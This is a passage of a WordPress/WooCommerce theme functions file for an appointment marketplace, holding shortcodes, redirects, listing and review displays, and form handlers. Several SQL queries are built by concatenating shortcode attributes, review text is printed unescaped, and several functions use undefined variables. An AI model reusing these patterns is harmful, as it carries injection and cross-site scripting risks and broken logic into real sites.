//         wp_redirect($url);
//     }
// }

// add_action( 'template_redirect', 'redirect_user_to_login_page' );

// function redirect_user_to_login_page(){
//     // Make sure your checkout page slug is correct
//     if( is_page('checkout') ) {
//         if( !is_user_logged_in() ) {
//             // Make sure your login page slug is correct in below line
//             wp_redirect('/checkout-page/');
//         }
//     }
// }

// add_action('template_redirect', 'woocommerce_custom_redirections');
// function woocommerce_custom_redirections() {
//     // Case1: Non logged user on checkout page (cart empty or not empty)
//     if ( !is_user_logged_in() && is_checkout() )
//         wp_redirect( get_page_by_title( 'checkout-page' ) );

//     // Case2: Logged user on my account page with something in cart
//     if( is_user_logged_in() && is_checkout() )
//         wp_redirect( get_page_by_title( 'checkout' ) );
// }

// function wpse_131562_redirect() {
//     if (
//         is_user_logged_in()
//         && ( is_checkout())
//     ) {
//         // feel free to customize the following line to suit your needs
//         wp_redirect( get_page_by_title( 'checkout' ) );
//     }
//     elseif (
//         ! is_user_logged_in()
//         && ( is_checkout())
//     ) {
//         // feel free to customize the following line to suit your needs
//         wp_redirect( get_page_by_title( 'checkout-page' ) );
//     }
// }
// add_action('template_redirect', 'wpse_131562_redirect');



function redirect_page() {

    if (isset($_SERVER['HTTPS']) &&
       ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) ||
       isset($_SERVER['HTTP_X_FORWARDED_PROTO']) &&
       $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') {
       $protocol = 'https://';
       }
       else {
       $protocol = 'http://';
   }

   $currenturl = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
   $currenturl_relative = wp_make_link_relative($currenturl);

   switch ($currenturl_relative) {
   
       case '/my-account/edit-address/':
           $urlto = home_url('/my-account/edit-account/');
           break;
       
       default:
           return;
   
   }
   
   if ($currenturl != $urlto)
       exit( wp_redirect( $urlto ) );


}
// add_action( 'template_redirect', 'redirect_page' );

// add_action('woocommerce_checkout_init','disable_billing');
// function disable_billing($checkout){
//   $checkout->checkout_fields['billing']=array();
//   return $checkout;
//   }

// remove_action( 'woocommerce_checkout_order_review', 'woocommerce_checkout_payment', 20 );
//add_action( 'woocommerce_checkout_before_customer_details', 'woocommerce_checkout_payment', 20 );


//  remove_action( 'woocommerce_checkout_order_review', 'woocommerce_order_review', 10);
//  add_action( 'woocommerce_checkout_before_customer_details', 'woocommerce_order_review', 10 );

// add_action( 'woocommerce_review_order_after_submit', 'bbloomer_privacy_message_below
//  _checkout_button' );
// function bbloomer_privacy_message_below_checkout_button() {
//   echo '<p><small>Your account will not be charged until the professional has agreed to the appointment request</small></p>';
// }
// // remove_action('woocommerce_order_button_html', 'remove_order_button_html', 20 );

function shortcode_my_orders( $atts ) {
    extract( shortcode_atts( array(
        'order_count' => -1
    ), $atts ) );

    ob_start();
    wc_get_template( 'myaccount/my-orders.php', array(
        'current_user'  => get_user_by( 'id', get_current_user_id() ),
        'order_count'   => $order_count
    ) );
    return ob_get_clean();
}
add_shortcode('my_orders', 'shortcode_my_orders');

function bbloomer_redirect_checkout_add_cart( $url ) {
   $url = get_permalink( get_option( 'woocommerce_checkout_page_id' ) ); 
   return $url;
}
 
add_filter( 'woocommerce_add_to_cart_redirect', 'bbloomer_redirect_checkout_add_cart' );

function userID(){
    global $wpdb,$wp, $WCFM, $wc_product_attributes;
    $user = wp_get_current_user();
    $id = apply_filters( 'wcfm_current_vendor_id',$user->ID );
    return $id;
}
add_shortcode('currentUserID','userID');

function categoryList(){
    global $WCFM, $WCFMmp, $wpdb,$wp_query;
        $user = wp_get_current_user();
        $id = $user->ID;
      $categories = $wpdb->get_results("SELECT
      t.name AS product_category,
      t.slug AS product_slug
    FROM wp_posts AS p 
    LEFT JOIN wp_postmeta pm1 ON pm1.post_id = p.ID
    LEFT JOIN wp_term_relationships AS tr ON tr.object_id = p.ID
    JOIN wp_term_taxonomy AS tt ON tt.taxonomy = 'product_cat' AND tt.term_taxonomy_id = tr.term_taxonomy_id 
    JOIN wp_terms AS t ON t.term_id = tt.term_id
    JOIN wp_users AS u ON p.post_author=u.ID 
    WHERE  pm1.post_id = p.ID 
   AND p.post_author= u.ID 
    GROUP BY product_category");
    foreach($categories as $categ){
        array_push($categArr,$categ->product_category);
    }
   
    $categArr = array_map("unserialize", array_unique(array_map("serialize", $categArr)));
   

    $selectedCateg='';
   $html = '<select name="cat" id="cat_select" onchange="catnameSelect()">';
   $html .= '<option value="" disabled selected="selected">Select Category</option>'; //  :P
   foreach($categories as $categ ) 
   {
       $selectedCateg = $categ->product_slug;
      $html .= '<option value="'.$categ->product_slug.'">'.$categ->product_category.'</option>';

   }
   $html .= '</select>';
   return $html;
}
add_shortcode('optionCategory','categoryList');


function displayDataOfListings($atts =''){
        global $WCFM, $WCFMmp, $wpdb,$wp_query;
        $user = wp_get_current_user();
        $id = $user->ID;
      
      $value =shortcode_atts( array(
        'status' => ''
    ), $atts);
      
  $longstring ='';

// FOR ALL
$longstring.='<div class="dropdowncontent" id="1" style="display: block" >';
   if (current_user_can('administrator')){
       if($value['status']=="all"){
       $select1 = $wpdb->get_results("
      SELECT u.display_name,u.ID,
      p.ID, p.post_status, p.guid,
      p.post_title, 
      t.name AS product_category,
      t.term_id AS product_id,
      t.slug AS product_slug
    FROM wp_posts AS p 
    LEFT JOIN wp_postmeta pm1 ON pm1.post_id = p.ID
    LEFT JOIN wp_term_relationships AS tr ON tr.object_id = p.ID
    JOIN wp_term_taxonomy AS tt ON tt.taxonomy = 'product_tag' AND tt.term_taxonomy_id = tr.term_taxonomy_id 
    JOIN wp_terms AS t ON t.term_id = tt.term_id
    JOIN wp_users AS u ON p.post_author=u.ID 
    WHERE p.post_type in('product', 'product_variation') AND p.post_status='publish' OR p.post_status='draft' OR p.post_status='archived' OR p.post_status='pending' OR p.post_status='trash'  AND p.post_content <> ''
    GROUP BY p.ID, p.post_title");
     }else{
          $select1 = $wpdb->get_results("
      SELECT u.display_name,u.ID,
      p.ID, p.post_status, p.guid,
      p.post_title, 
      t.name AS product_category,
      t.term_id AS product_id,
      t.slug AS product_slug
    FROM wp_posts AS p 
    LEFT JOIN wp_postmeta pm1 ON pm1.post_id = p.ID
    LEFT JOIN wp_term_relationships AS tr ON tr.object_id = p.ID
    JOIN wp_term_taxonomy AS tt ON tt.taxonomy = 'product_tag' AND tt.term_taxonomy_id = tr.term_taxonomy_id 
    JOIN wp_terms AS t ON t.term_id = tt.term_id
    JOIN wp_users AS u ON p.post_author=u.ID 
    WHERE p.post_type in('product', 'product_variation') AND p.post_status='".$value['status']."'  AND p.post_content <> ''
    GROUP BY p.ID, p.post_title");
     }
   }
     else{
       $select1 = $wpdb->get_results("
      SELECT u.display_name,u.ID,
      p.ID, p.post_status, p.guid,
      p.post_title, 
      t.name AS product_category,
      t.term_id AS product_id,
      t.slug AS product_slug
    FROM wp_posts AS p 
    LEFT JOIN wp_postmeta pm1 ON pm1.post_id = p.ID
    LEFT JOIN wp_term_relationships AS tr ON tr.object_id = p.ID
    JOIN wp_term_taxonomy AS tt ON tt.taxonomy = 'product_tag' AND tt.term_taxonomy_id = tr.term_taxonomy_id 
    JOIN wp_terms AS t ON t.term_id = tt.term_id
    JOIN wp_users AS u ON p.post_author=u.ID 
    WHERE  pm1.post_id = p.ID 
   AND p.post_author= u.ID 
   AND u.ID= ".$id." 
    GROUP BY p.ID, p.post_title");
     }
        $longstring .= '<div class="container" id="containerCon">';
        $longstring .= '<div class="row">';
        foreach ($select1 as $fld1) {
            if($fld1->post_status!="trash"){
 
          $longstring .= '<div class="col-md-6">';
          $longstring .= '<div class="wrapper">';
            $longstring .= '<div class="one gridcell">'.$fld1->post_title.'</div>';
            $longstring .= '<div class="two gridcell">';
            $longstring .= '<span class="fa fa-star checked"></span>(0)&nbsp;<span class="fa fa-star"></span>54 Streak&nbsp;3&nbsp;<i class="fa fa-handshake-o" aria-hidden="true"></i>&nbsp;Referral&nbsp;';
            $longstring .= "</div>";

            if($fld1->post_status!="publish"){
            $longstring .= '<div class="three gridcell"><a href="#" class="greyedout">Invite<i class="fa fa-user-plus" aria-hidden="true"></i></a></div>';
            }
            else{
                $longstring .= '<div class="three gridcell"><a href="'.get_home_url().'/professional-manager/appointments-manual/" target="_blank" class="button">Invite<i class="fa fa-user-plus" aria-hidden="true"></i></a></div>';
            }

            $longstring .= '<div class="four gridcell">'.$fld1->product_slug.'</div>';
            $longstring .= '<div class="five gridcell"></div>';

  
            if($fld1->post_status=="publish"){

            $longstring .= '<button class="delist" onclick="archiveFunc('.$fld1->ID.')" ><div class="six gridcell"><i class="fa fa-circle-o" aria-hidden="true" style="background-color:green"></i>&nbsp;Listed</div></button>';
            }
            else if($fld1->post_status=="archived"){
                  $longstring .= '<button class="delist" onclick="publishFunc('.$fld1->ID.')" ><div class="six gridcell"><i class="fa fa-circle-o" aria-hidden="true" style="background-color:orange"></i>&nbsp;De-Listed</div></button>';
                  $longstring .= '<div class="nine gridcell" onclick="trashFunc('.$fld1->ID.')"><i class="fa fa-trash" aria-hidden="true"></i></div>';
            }
            else if($fld1->post_status=="pending" || $fld1->post_status=="draft"){
                $longstring .= '<div class="six gridcell"><i class="fa fa-circle-o" aria-hidden="true" style="background-color:blue"></i>&nbsp;Processing</div>';
                $longstring .= '<div class="nine gridcell" onclick="trashFunc('.$fld1->ID.')"><i class="fa fa-trash" aria-hidden="true"></i></div>';
            }
            $longstring .='<div class="seven gridcell"><a href="'.get_home_url().'/professional-manager/products-manage/'.$fld1->ID.'" target="_blank" style="color:blue;text-decoration:underline">Manage Calendar and Listing Details</a></div>';

            $longstring .= '<div class="eight gridcell"></div>';
            if($fld1->post_status=="publish"){
                $longstring .= '<div class="nine gridcell" onclick="trashFunc('.$fld1->ID.')"><i class="fa fa-trash" aria-hidden="true"></i></div>';
            }
            
             $longstring .= "</div>";
              $longstring .= "</div>";
                             
            }   

        }
         $longstring .= "</div>";
          $longstring .= "</div>";
       

$longstring .='</div>';
 return $longstring;
        // var_dump($value['status']);
    }
    
    add_shortcode('displaytolistingpage','displayDataOfListings');


//User redirection



//   add_action( 'pp_before_login_redirect', 'admin_ini', 10, 3 );

// function admin_ini( $username, $password, $login_form_id ) {

//     $a = get_user_by( 'login', $username );
//     //retrieve the user roles
//     $user_roles = $a->roles;

//     /**
//      * we'll be redirect users with student role to http://xyz.com/student/
//      * and those with teacher role to http://xyz.com/teacher/
//      */
//     if ( in_array( 'user', $user_roles ) ) {
//         $redirect = 'https://gigant.com.ph/home/';
//     }
//     elseif ( in_array( 'professionals', $user_roles ) ) {
//         $redirect = 'https://gigant.com.ph/professional-manager/';
//     }
//     else {
//         // default to login redirect url set in plugin settings
//         $redirect = pp_login_redirect();
//     }

//     wp_redirect( $redirect );
//     exit;
// }

//     add_action( 'woocommerce_thankyou', function( $order_id ){
//     $order = new WC_Order( $order_id );

//     $url = 'http://redirect-here.com';

//     if ( $order->status != 'failed' ) { 
//         echo "<script type=\"text/javascript\">window.location = '".$url."'</script>";
//     }
// });

add_filter( 'wcfm_product_manager_content_fields', function( $wcfm_product_manager_content_fields ) {
    if( is_account_page() && isset( $wcfm_product_manager_content_fields['wcfm_wpeditor'] ) ) {
        $wcfm_product_manager_content_fields['wcfm_wpeditor']['type'] = 'textarea';
        $wcfm_product_manager_content_fields['wcfm_wpeditor']['class'] = 'wcfm-textarea wcfm_ele wcfm_full_ele simple variable external grouped booking';
    }
    return $wcfm_product_manager_content_fields;
});

add_action('wp_logout','ps_redirect_after_logout');
function ps_redirect_after_logout(){
         wp_redirect(home_url());
         exit();
}
function popularSearch(){
    global $WCFM, $WCFMmp, $wpdb,$wp_query;
    $categArr=[];
    $query_args = array(
        'post_type' => 'product',
        'post_status' => 'publish',
        'posts_per_page' => '4',
        'fields' => 'ids',
        'meta_key' => '_wcfm_product_views',
        'orderby' => 'meta_value_num',
        'meta_query' => WC()->query->get_meta_query()
    );
    $string='';
    $best_sell_products_query = get_posts($query_args);
    
    foreach($best_sell_products_query as $prodid){
        $categs=wp_get_post_terms( $prodid, 'product_cat' );
        foreach($categs as $categ){
            if($categ->slug !== 'cook' && $categ->slug !== 'etc' && $categ->slug !== 'journalists'){
                array_push($categArr,$categ);
            }
        }
    }
   
    $categArr = array_map("unserialize", array_unique(array_map("serialize", $categArr)));
    foreach($categArr as $categ){
            $string .= '<a href="'.get_home_url().'/'.$categ->slug.'" ><button class="popularSearch">'.$categ->name.'</button</a> ';
    }
    return $string;
    //  print_r($categArr);
}
add_shortcode('popular_searches','popularSearch');

function toBase64($num, $b=62){
    $base='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $r = $num  % $b ;
    $res = $base[$r];
    $q = floor($num/$b);
    while ($q) {
        $r = $q % $b;
        $q =floor($q/$b);
        $res = $base[$r].$res;
    }
    return $res;
}
function dateFilter(){
    $ls = '';
    $ls .= '<div class="wcfm-date-range-field">';
    $ls .='<div class="wfpTitle"><b>Sort by Available Dates</b></div>';
    $ls .= ' <input type="date" name="wcfm-date_from" id="from_date" class="wcfm-date-range" placeholder="Choose From Range ..." value="" > ';
    $ls .= ' <input type="date" name="wcfm-date_to" id="to_date" class="wcfm-date-range" placeholder="Choose To Range ..." value="" > ';
    $ls .= '</div>';
    
    return $ls;
}
add_shortcode('filter_nextAvail','dateFilter');

function storevendorDetails (){
    global $WCFM, $WCFMmp, $wpdb,$wp_query;
    $store_user      = wcfmmp_get_store( $store_id );
    $store_info      = $store_user->get_shop_info();
    $gravatar        = $store_user->get_avatar();
    $banner_type     = $store_user->get_list_banner_type();
    if( $banner_type == 'video' ) {
      $banner_video = $store_user->get_list_banner_video();
    } else {
      $banner          = $store_user->get_list_banner();
      if( !$banner ) {
        $banner = isset( $WCFMmp->wcfmmp_marketplace_options['store_list_default_banner'] ) ? $WCFMmp->wcfmmp_marketplace_options['store_list_default_banner'] : $WCFMmp->plugin_url . 'assets/images/default_banner.jpg';
        $banner = apply_filters( 'wcfmmp_list_store_default_bannar', $banner );
      }
    }
    $store_name      = isset( $store_info['store_name'] ) ? esc_html( $store_info['store_name'] ) : __( 'N/A', 'wc-multivendor-marketplace' );
    $store_name      = apply_filters( 'wcfmmp_store_title', $store_name , $store_id );
    $store_url       = wcfmmp_get_store_url( $store_id );
    $store_address   = $store_user->get_address_string(); 
    $store_description = $store_user->get_shop_description();
    $searchUrl = $wp_query->query_vars['professionalSearch'];
}
 
function disable_tiny_mce_editor($allow) {
    return '';
}
add_filter('wcfm_is_allow_rich_editor', 'disable_tiny_mce_editor', 501);

// Appointments Shortcode [my_appointments]
add_shortcode( 'my_appointments', 'my_appointments_shortcode' );
function my_appointments_shortcode() {
    // Stop here when user is not logged in.
    if ( ! is_user_logged_in() ) {
        return;
    }

    ob_start();
    
    $appointments = new WC_Appointment_Order_Manager();
    
    $appointments->my_appointments( 1 );
    
    return ob_get_clean();
}

// // Appointments Shortcode [my_appointments]
// add_shortcode( 'my_appointments', 'my_appointments_shortcode' );
// function my_appointments_shortcode() {
//     //* Stop here when user is not logged in
//     if ( ! is_user_logged_in() ) {
//         return;
//     }
    
//     //* Get all appointments for current user
//     $appointments = WC_Appointments_Controller::get_appointments_for_user( get_current_user_id() );

//     ob_start();
    
//     if ( $appointments ) {
//         wc_get_template( 'myaccount/appointments.php', array( 'appointments' => $appointments ), 'woocommerce-appointments/', WC_APPOINTMENTS_TEMPLATE_PATH );
//     }
    
//     return ob_get_clean();
// }








/** Log in redirect to previous page by portalpacific.net **/
// start global session for saving the referer url
function start_session() {
    if(!session_id()) {
        session_start();
    }
}
add_action('init', 'start_session', 1);

// get the referer url and save it to the session
function redirect_url() {
    if (! is_user_logged_in()) {
        $_SESSION['referer_url'] = wp_get_referer();
    } else {
        session_destroy();
    }
}
add_action( 'template_redirect', 'redirect_url' );

//login redirect to referer url
function login_redirect() {
    if (isset($_SESSION['referer_url'])) {
        wp_redirect($_SESSION['referer_url']);
    } else {
        wp_redirect(home_url());
    }
}
add_filter('woocommerce_login_redirect', 'login_redirect', 1100, 2);

/** end here */

add_filter( 'woocommerce_appointments_time_slot_html', 'custom_time_slot_html', 10, 8 );
function custom_time_slot_html( $slot_html, $slot, $quantity, $time_to_check, $staff_id, $timezone, $appointable_product, $spaces_left ) {
    // Timezones.
    $timezone_datetime = new DateTime();
    $local_time  = wc_appointment_timezone_locale( 'site', 'user', $timezone_datetime->getTimestamp(), wc_time_format(), $timezone );
    $site_time   = wc_appointment_timezone_locale( 'site', 'user', $timezone_datetime->getTimestamp(), wc_time_format(), wc_timezone_string() );
    $slot_locale = ( $local_time !== $site_time ) ? sprintf( __( ' data-locale="Your local time: %s"', 'woocommerce-appointments' ), wc_appointment_timezone_locale( 'site', 'user', $slot, wc_date_format() . ', ' . wc_time_format(), $timezone ) ) : '';

    // Selected.
    $selected = date( 'G:i', $slot ) == date( 'G:i', $time_to_check ) ? ' selected' : '';

    // Get end time.
    $end_time = strtotime( '+ ' . $appointable_product->get_duration() . ' ' . $appointable_product->get_duration_unit(), $slot );

    // Slot HTML.
    if ( $quantity['scheduled'] ) {
        /* translators: 1: quantity available */
        $slot_html = "<li class=\"slot$selected\"$slot_locale data-slot=\"" . esc_attr( date( 'Hi', $slot ) ) . "\"><a href=\"#\" data-value=\"" . date_i18n( 'G:i', $slot ) . "\">" . date_i18n( wc_time_format(), $slot ) . " &mdash; " . date_i18n( wc_time_format(), $end_time ) . " <small class=\"spaces-left\">" . $spaces_left . "</small></a></li>";
    } else {
        $slot_html = "<li class=\"slot$selected\"$slot_locale data-slot=\"" . esc_attr( date( 'Hi', $slot ) ) . "\"><a href=\"#\" data-value=\"" . date_i18n( 'G:i', $slot ) . "\">" . date_i18n( wc_time_format(), $slot ) . " &mdash; " . date_i18n( wc_time_format(), $end_time ) . "</a></li>";
    }
     return $slot_html;
    
}


function get_product_total_sales( $atts, $content = null ) {
     
    global $wpdb;
     
    extract( shortcode_atts( array(
        'productid' => get_the_ID(),
    ), $atts, 'total_spent_single_product' ) );
     
    $total_sales = $wpdb->get_var( "SELECT SUM( order_item_meta__line_total.meta_value) as order_item_amount 
        FROM {$wpdb->posts} AS posts
        INNER JOIN {$wpdb->prefix}woocommerce_order_items AS order_items ON posts.ID = order_items.order_id
        INNER JOIN {$wpdb->prefix}woocommerce_order_itemmeta AS order_item_meta__line_total ON (order_items.order_item_id = order_item_meta__line_total.order_item_id)
            AND (order_item_meta__line_total.meta_key = '_line_total')
        INNER JOIN {$wpdb->prefix}woocommerce_order_itemmeta AS order_item_meta__product_id_array ON order_items.order_item_id = order_item_meta__product_id_array.order_item_id 
        WHERE posts.post_type IN ( 'shop_order' )
        AND posts.post_status IN ( 'wc-completed' ) AND ( ( order_item_meta__product_id_array.meta_key IN ('_product_id','_variation_id') 
        AND order_item_meta__product_id_array.meta_value IN ('{$productid}') ) );" );
     
    return wc_price( $total_sales );
}
add_shortcode('product_total_sales', 'get_product_total_sales');

// function blog_scripts() {
//     // Register the script
//     wp_register_script( 'custom-script', get_stylesheet_directory_uri(). '/js/custom.js', array('jquery'), false, true );
  
//     // Localize the script with new data
//     $script_data_array = array(
//         'ajaxurl' => admin_url( 'admin-ajax.php' ),
//         'security' => wp_create_nonce( 'load_states' ),
//     );
//     wp_localize_script( 'custom-script', 'blog', $script_data_array );
  
//     // Enqueued script with localized data.
//     wp_enqueue_script( 'custom-script' );
// }
// add_action( 'wp_enqueue_scripts', 'blog_scripts' );


add_filter( 'woocommerce_variable_sale_price_html', 'businessbloomer_remove_prices', 10, 2 );
add_filter( 'woocommerce_variable_price_html', 'businessbloomer_remove_prices', 10, 2 );
add_filter( 'woocommerce_get_price_html', 'businessbloomer_remove_prices', 10, 2 );
 
function businessbloomer_remove_prices( $price, $product ) {
if ( ! is_admin() ) $price = '';
return $price;
}


//Display all product reviews
if (!function_exists('display_all_reviews')) {
function display_all_reviews(){
    $args = array(
       'status' => 'approve',
       'type' => 'review'
    );

    // The Query
    $comments_query = new WP_Comment_Query;
    $comments = $comments_query->query( $args );

    // Comment Loop
    if ( $comments ) {
        echo "<ol>";
        foreach ( $comments as $comment ): ?>
        <?php if ( $comment->comment_approved == '0' ) : ?>
            <p class="meta waiting-approval-info">
                <em><?php _e( 'Thanks, your review is awaiting approval', 'woocommerce' ); ?></em>
            </p>
            <?php endif;  ?>
            <li itemprop="reviews" itemscope itemtype="http://schema.org/Review" <?php comment_class(); ?> id="li-review-<?php echo $comment->comment_ID; ?>">
                <div id="review-<?php echo $comment->comment_ID; ?>" class="review_container">
                    <div class="review-avatar">
                        <?php echo get_avatar( $comment->comment_author_email, $size = '50' ); ?>
                    </div>
                    <div class="avatar-info">
                        <div class="avatar-name"><?php echo $comment->comment_author; ?></div>
                        <div class="avatar-star"><i class="fa fa-star"></i><?php echo get_comment_meta( $comment->comment_ID, 'rating', true ); ?>
                            <!-- <div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating" class="star-rating" title="<?php echo esc_attr( get_comment_meta( $comment->comment_ID, 'rating', true ) ); ?>">
                                <span style="width:<?php echo get_comment_meta( $comment->comment_ID, 'rating', true )*22; ?>px"><span itemprop="ratingValue"><?php echo get_comment_meta( $comment->comment_ID, 'rating', true ); ?></span> <?php _e('out of 5', 'woocommerce'); ?></span>
                                </div> -->
                        </div>
                    </div>




                    <div class="review-author-name" itemprop="author"><?php // echo $comment->comment_author; ?>
                    <!-- <div class='star-rating-container'>
                            <div itemprop="reviewRating" itemscope itemtype="http://schema.org/Rating" class="star-rating" title="<?php echo esc_attr( get_comment_meta( $comment->comment_ID, 'rating', true ) ); ?>">
                                <span style="width:<?php echo get_comment_meta( $comment->comment_ID, 'rating', true )*22; ?>px"><span itemprop="ratingValue"><?php echo get_comment_meta( $comment->comment_ID, 'rating', true ); ?></span> <?php _e('out of 5', 'woocommerce'); ?></span>

                                    
                            </div>
                        
                    </div> -->

                    <div class="review-text">
                        <div itemprop="description" class="description">
                            <?php echo $comment->comment_content; ?>
                        </div>
                        <div class="clear"></div>
                    </div>
                    <div class="review-author">
                        
                        
                            <?php
                                        $timestamp = strtotime( $comment->comment_date ); //Changing comment time to timestamp
                                        $date = date('F d, Y', $timestamp);
                            ?>
                            <em class="review-date">
                                <time itemprop="datePublished" datetime="<?php echo $comment->comment_date; ?>"><?php echo $date; ?></time>
                            </em>
                        </div>
                    </div>
                    <div class="clear"></div>
                    
                <div class="clear"></div>           
            </div>
        </li>

        <?php 
        endforeach;
        echo "</ol>";
    } else {
        echo "This product hasn't been rated yet.";
    }
}
}

function get_star_ratings()
{
    global $woocommerce, $product;
    $average = $product->get_average_rating();
    $rating_count = $product->get_rating_count();
    echo '<div class="overall"<p>Overall Ratings: </p><div style="color:gold;" class="star-rating"><span style="width:'.( ( $average / 5 ) * 100 ) . '%"><strong itemprop="ratingValue" class="rating">'.$average.'</strong> '.__( 'out of 5', 'woocommerce' ).'</span></div>';
    echo  '(' ,$rating_count , ')</div>';

}
add_shortcode('star-reviews', 'get_star_ratings'); 

function get_star_rating()
{
    global $woocommerce, $product;
    $average = $product->get_average_rating();
    
    echo '<div style="color:gold;" class="star-rating"><span style="width:'.( ( $average / 5 ) * 100 ) . '%"><strong itemprop="ratingValue" class="rating">'.$average.'</strong> '.__( 'out of 5', 'woocommerce' ).'</span></div>';

}

function woocommerce_product_author() {
    the_author();
}

// function that runs when shortcode is called
function get_stars() { 
 global $woocommerce, $product;
// Things that you want to do. 
 $rating_count = $product->get_rating_count();
$message = '<div class="col-sm-3">
                <div class="ratings-container">
                <div class="ratings-content">
                <p>Overall Rating: </p><p class="color-rating">';
                echo get_star_rating(), '(' ,$rating_count , ')';
                echo '</p>
                </div><br>
                <div class="ratings-content">
                <p>Helpfulness: </p>';
                echo get_star_rating();
                echo '</div>
                <div class="ratings-content">
                <p>Preparedness: </p>';
                echo get_star_rating();
                echo '</div>
                <div class="ratings-content">
                <p>Professionalism: </p>';
                echo get_star_rating();
                echo '</div>
                <div class="ratings-content">
                <p>Communication Skills: </p>';
                echo get_star_rating();
                echo '</div>
                <div class="ratings-content">
                <p>Recommendation: </p>';
                echo get_star_rating();
                echo '</div>
        </div>'; 
 
// Output needs to be return
return $message;
} 
// register shortcode
add_shortcode('getstars', 'get_stars'); 

function pendingstatus() { 
    global $wpdb;
$posts_table = $wpdb->prefix.'posts';
$query = "SELECT COUNT(*) AS count FROM ".$wpdb->prefix."posts WHERE post_type LIKE 'wc_appointment' AND post_status LIKE 'pending-confirmation'";

$result = $wpdb->get_results($query);
// var_dump($result);

         return $result[0]->count;
// This line will disaply the number
    
} 
// register shortcode
add_shortcode('pending_status', 'pendingstatus'); 

// global $wpdb;
//     $user = wp_get_current_user();
//     $user_id = get_current_user_id();
//      $posts_table = $wpdb->prefix.'posts';
//         $users_table = $wpdb->prefix.'users';
//      $query = "SELECT COUNT(*) AS count FROM ".$wpdb->prefix."posts WHERE post_type LIKE 'wc_appointment' AND post_status LIKE 'confirmed'";
//      $query1 = "SELECT COUNT(*) AS count FROM ".$wpdb->prefix."posts, ".$wpdb->prefix."users as users WHERE post_type LIKE 'wc_appointment' AND post_status LIKE 'unpaid' AND users.ID = ".$user_id."";
//      $result = $wpdb->get_results($query); //confirmed
//      $result1 = $wpdb->get_results($query1); //pending
//                  //var_dump($result);
                    
//                  //echo $result[0]->count; // This line will disaply the number 
//      $status = '(' .$result1[0]->count .') Pending';

//  return $status;


add_filter( 'wcfm_allowed_booking_status', function( $booking_statuses ) {
    if( wcfm_is_vendor() ) {
        unset( $booking_statuses['unpaid'] );
        unset( $booking_statuses['pending-confirmation'] );
        unset( $booking_statuses['confirmed'] );
        unset( $booking_statuses['in-cart'] );
    }
    return $booking_statuses;
}, 50, 2 );

// function review_shortcode(){
// }
// add_shortcode( 'reviewshortcode', 'review_shortcode' );

// add_action('wp_ajax_wcfmu_duplicate_product',function(){

// });

function add_sublisting($product_id){
        setcookie("sublisting_product",$product_id, time()+3600*24); 
        $_COOKIE['sublisting_product'] = $product_id;
}

add_action( 'woocommerce_order_details_after_order_table', 'nolo_custom_field_display_cust_order_meta', 10, 1 );


if(isset($_POST['submitreason'])){
    insert_reasoncomplete();
}
if(isset($_POST['submitdecline'])){
    insert_reasondecline();
}
if(isset($_POST['submitrefer'])){
    insert_referandrespond();
}

function insert_reasoncomplete(){
    global $wpdb;

    $table=$wpdb->prefix.'reason';
    $id = isset( $_POST['id'] ) ? sanitize_text_field( $_POST['id'] ) : '';
    $post_id = isset( $_POST['post_id'] ) ? sanitize_text_field( $_POST['post_id'] ) : '';
    $reason = isset( $_POST['reason'] ) ? sanitize_text_field( $_POST['reason'] ) : '';
    $appointment = new WC_Appointment( $appointment_id );
    $appointment_id = $wp->query_vars['wcfm-appointments-details'];
    $post_data=array(
        'id' => NULL,
        'post_id' => $post_id,
        'reason' => $reason
    );
    $wpdb->insert( $table, $post_data,array('%s','%s','%s'));
    $page_url = home_url( $wp->request );
    $redirect_to = add_query_arg($page_url);

    wp_safe_redirect( $redirect_to );
    exit;
}

function insert_reasondecline(){
    global $wpdb;

    $table=$wpdb->prefix.'reason';
    $id = isset( $_POST['id'] ) ? sanitize_text_field( $_POST['id'] ) : '';
    $post_id = isset( $_POST['reasonpost_id'] ) ? sanitize_text_field( $_POST['reasonpost_id'] ) : '';
    $reason = isset( $_POST['reason_comment'] ) ? sanitize_text_field( $_POST['reason_comment'] ) : '';
    $appointment = new WC_Appointment( $appointment_id );
    $appointment_id = $wp->query_vars['wcfm-appointments-details'];
    $post_datadecline=array(
        'id' => NULL,
        'post_id' => $post_id,
        'reason' => $reason
    );
    $wpdb->insert( $table, $post_datadecline,array('%s','%s','%s'));
    $page_url = home_url( $wp->request );
    $redirect_to = add_query_arg($page_url);

    wp_safe_redirect( $redirect_to );
    exit;
}

function insert_referandrespond(){
    global $wpdb;

    $table=$wpdb->prefix.'reason';
    $id = isset( $_POST['refer_id'] ) ? sanitize_text_field( $_POST['refer_id'] ) : '';
    $post_id = isset( $_POST['referpost_id'] ) ? sanitize_text_field( $_POST['referpost_id'] ) : '';
    $reason = isset( $_POST['refer_pro'] ) ? sanitize_text_field( $_POST['refer_pro'] ) : '';
    $post_author = isset( $_POST['postauthor'] ) ? sanitize_text_field( $_POST['postauthor'] ) : '';
    $display_name = isset( $_POST['displayname'] ) ? sanitize_text_field( $_POST['displayname'] ) : '';
    $post_title = isset( $_POST['posttitle'] ) ? sanitize_text_field( $_POST['posttitle'] ) : '';
    $post_status = isset( $_POST['poststatus'] ) ? sanitize_text_field( $_POST['poststatus'] ) : '';
    $appointment = new WC_Appointment( $appointment_id );
    $appointment_id = $wp->query_vars['wcfm-appointments-details'];
    $post_datarefer=array(
        'id' => NULL,
        'post_id' => $post_id,
        'reason' => $reason,
        'post_author' => $post_author,
        'display_name' => $display_name,
        'post_title' => $post_title,
        'post_status' => $post_status
    );
    $wpdb->insert( $table, $post_datarefer,array('%s','%s','%s','%s','%s','%s','%s'));
    $page_url = home_url( $wp->request );
    $redirect_to = add_query_arg($page_url);

    wp_safe_redirect( $redirect_to );
    exit;
}